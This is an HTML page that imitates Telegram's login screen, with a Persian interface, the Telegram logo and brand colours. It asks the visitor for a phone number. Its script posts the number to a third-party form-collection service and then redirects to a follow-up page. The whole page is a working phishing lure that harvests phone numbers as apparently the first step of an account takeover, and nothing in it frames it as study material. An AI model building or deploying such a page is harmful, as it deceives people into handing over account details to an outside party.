<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>ورود شماره تلگرام</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0088cc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }
    .container {
      background-color: white;
      border-radius: 12px;
      padding: 30px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
    }
    .logo {
      margin-bottom: 10px;
    }
    .logo img {
      width: 60px;
    }
    .instruction {
      font-size: 14px;
      margin-bottom: 20px;
      color: #333;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #0088cc;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0075b6;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
    </div>
    <div class="instruction">
      Please enter your phone number
    </div>

    <form id="phoneForm" action="https://formspree.io/f/xjkokdbr" method="POST" onsubmit="return submitForm(event)">
      <input type="text" id="phone" name="phone" placeholder="شماره موبایل" required />
      <button type="submit">Next</button>
    </form>
  </div>

  <script>
    function submitForm(event) {
      event.preventDefault();

      const phoneInput = document.getElementById('phone');
      const phone = phoneInput.value.trim();

      if (phone === '') {
        alert('لطفاً شماره موبایل خود را وارد کنید');
        return false;
      }

      fetch('https://formspree.io/f/xjkokdbr', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ phone: phone })
      })
      .then(response => {
        if (response.ok) {
          window.location.href = "index2.html";
        } else {
          alert('مشکلی در ارسال شماره پیش آمد، لطفاً دوباره تلاش کنید');
        }
      })
      .catch(error => {
        alert('خطا در ارسال شماره: ' + error.message);
      });

      return false;
    }
  </script>
</body>
</html>
